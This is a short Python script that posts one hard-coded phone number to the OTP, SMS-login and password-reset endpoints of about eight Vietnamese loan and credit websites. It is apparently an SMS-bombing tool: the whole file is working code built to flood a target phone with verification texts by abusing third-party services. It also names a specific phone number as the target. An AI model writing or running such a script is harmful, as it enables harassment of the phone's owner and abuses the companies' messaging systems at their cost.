import requests
phone = "0345382198"
data = {"loan_phone": phone,"action": "fe_loan_resendotp"}
requests.post("https://fecredit.com.vn/wp-admin/admin-ajax.php",data=data)
data = {"login":phone}
requests.post("https://api.vayvnd.vn/v1/users/password-reset",json=data)
data = {"phone": phone,"sign": "67d44dda-b29f-48a4-9830-67121bc618f8"}
requests.post("https://api.vtvay.com/v1/verify/sms/send",data= data)
data = {"mobile": phone,"companyId":"5e030a2d0683f71328532063","appId":"5e030a1b0683f71328532062","userType":1}
requests.post("https://www.hbcredit.cc/sms/login",json=data)
data = {"mobile": phone,"companyId":"5e030a2d0683f71328532063","appId":"5e030a1b0683f71328532062","userType":1}
requests.post("http://www.vayhome.com/sms/login",json=data)
data = {"phone": phone,"sign": "67d44dda-b29f-48a4-9830-67121bc618f8"}
requests.post("https://api.tiencash.com/v1/verify/sms/send",data=data)
requests.post("https://webapp.okmoney.cc/_api/auth/login/sms?mobile="+phone)
data = {"mobile": phone}
requests.post("http://h5.postvay.com/_api/auth/login/sms",data = data)
